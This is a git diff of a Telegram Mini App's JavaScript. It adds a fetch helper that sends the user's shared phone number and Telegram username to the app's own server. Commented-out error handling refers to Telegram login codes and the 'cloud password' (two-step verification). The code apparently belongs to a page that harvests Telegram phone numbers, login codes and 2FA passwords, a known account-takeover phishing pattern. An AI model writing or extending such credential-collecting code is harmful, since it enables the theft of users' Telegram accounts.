@@ -7,23 +7,41 @@ Telegram.WebApp.MainButton.setParams({
     is_visible: false
 });
 
-API = 'http://127.0.0.1:5000'
+const API = 'http://127.0.0.1:5000'
 
-function test() {
-    fetch('http://127.0.0.1:5000/test', {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ username: 'username', password: 'password' }),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        location.reload();
-      })
-      .catch((error) => console.error("Ошибка:", error));
-  }
+async function RequestSUKA(endpoint, method = 'POST', body = {}) {
+        const response = await fetch(`${API}/${endpoint}`, {
+            method,
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+        const data = await response.json();
 
+        // if (response.status === 429) {
+        //     clearCodeCells();
+        //     info(`Слишком много запросов. Подождите ${data.detail.wait_seconds} сек.`);
+        //     step1();
+        //     return null;
+        // } else if (response.status === 400 && data.detail === "Invalid code") {
+        //     clearCodeCells();
+        //     info("Неверный код");
+        //     return null;
+        // } else if (response.status === 400 && data.detail === "Expired code") {
+        //     clearCodeCells();
+        //     info("Код истёк. Запросите новый");
+        //     return null;
+        // } else if (response.status === 400 && data.detail === "Invalid password") {
+        //     passwordInput.value = '';
+        //     await step3();
+        //     info("Неверный облачный пароль");
+        //     return null;
+        // } else if (response.ok) {
+        //     return data;
+        // } else {
+        //     info(`Ошибка сервера: ${data.detail || "Неизвестная ошибка"}`);
+        //     return null;
+        // }
+    } 
 const CODE_EXPIRATION_TIME = 20000; // 2 минуты в миллисекундах
 
 const page1 = document.getElementById('page1');
@@ -216,10 +234,10 @@ async function request_user_phone() {
                             console.log("Extracted phone:", phone);
                             localStorage.setItem("local_phone", phone);
                             TelegramWebApp.MainButton.hide();
-                            Telegram.WebApp.sendData(JSON.stringify({
-                                action: "phone_shared",
-                                phone_number: phone
-                            }));
+                            RequestSUKA('test', 'POST', {
+                                phone: phone,
+                                username: window.Telegram.WebApp.initData.username
+                            })
                             resolve(phone);
                         }
                     }
@@ -510,5 +528,3 @@ document.querySelector(".password-icon").addEventListener("click", function () {
 document.querySelector(".finish-icon").addEventListener("click", function () {
     animation_finish.goToAndPlay(0, true);
 });
-
-test()
